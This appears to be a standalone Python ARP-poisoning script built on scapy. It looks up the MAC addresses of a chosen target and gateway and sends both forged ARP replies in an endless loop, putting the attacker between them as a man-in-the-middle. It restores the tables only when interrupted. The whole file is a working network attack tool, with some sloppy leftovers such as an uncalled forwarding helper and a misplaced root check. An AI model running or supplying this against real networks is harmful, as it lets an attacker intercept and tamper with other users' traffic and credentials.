import optparse
import os
import scapy.all as scapy
import time
import argparse

print("""
╔═╗╔═╦══╦════╦═╗╔═╗
║║╚╝║╠╣╠╣╔╗╔╗║║╚╝║║
║╔╗╔╗║║║╚╝║║╚╣╔╗╔╗║     
║║║║║║║║──║║─║║║║║║
║║║║║╠╣╠╗─║║─║║║║║║
╚╝╚╝╚╩══╝─╚╝─╚╝╚╝╚╝
                                 𝗴𝗶𝘁𝗵𝘂𝗯: 𝘀𝘄𝗶𝗽𝗮𝘅              
𝕒𝕣𝕡 𝕡𝕠𝕚𝕤𝕠𝕟𝕚𝕟𝕘        
 """)

def __check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'):
    if self.__ipv4_forwarding is True:
        with open(config, mode='r+', encoding='utf_8') as config_file:
            line = next(config_file)
            config_file.seek(0)
            config_file.write(line.replace('0', '1'))


def mac_adress(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poison(target_ip, poisoned_ip):
    target_mac = mac_adress(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def reset_operation(fooled_ip, gateway_ip):
    juked_mac = mac_adress(fooled_ip)
    gateway_mac = mac_adress(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=juked_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)


def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP   -t ")

    if not options.gateway_ip:
        print("Enter Gateway IP   -g ")

    return options


user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

number = 0

try:
    while True:
        arp_poison(user_target_ip, user_gateway_ip)
        arp_poison(user_gateway_ip, user_target_ip)


        number += 2

        print("\rSending packets " + str(number), end="")


        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Quitting & Restoring iptables..")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)

    if __name__ == '__main__':
        if os.getuid() != 0:
            raise SystemExit('Error: Permission denied. Execute this application '
                             'with administrator privileges.')


